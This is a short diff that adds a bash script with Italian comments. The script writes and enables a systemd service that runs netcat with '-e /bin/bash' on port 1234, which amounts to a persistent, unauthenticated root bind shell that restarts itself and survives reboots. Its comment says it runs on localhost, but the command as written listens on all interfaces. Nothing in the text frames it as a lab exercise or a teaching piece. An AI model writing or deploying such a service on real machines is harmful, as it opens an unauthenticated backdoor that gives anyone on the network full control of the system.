@@ -1,0 +1,29 @@
+#!/bin/bash
+
+# salvare il file netcat-shell.service in 
+#   /etc/systemd/system/netcat-shell.service
+
+cat << EOF >> /etc/systemd/system/netcat-shell.service
+
+
+[Unit]
+Description=Netcat Shell
+After=network.target
+# avvia netcat in local host su porta 1234  
+#  si puo anche usare ExecStart=/bin/nc -l -p 1234 -e /bin/bash
+[Service]
+ExecStart=/bin/bash -c "/usr/bin/nc -l -p 1234 -e /bin/bash"  
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
+EOF 
+
+##### fine file 
+
+# per avviare il servizio fare un sh 
+
+sudo systemctl daemon-reload
+sudo systemctl enable netcat-shell
+sudo systemctl start netcat-shell
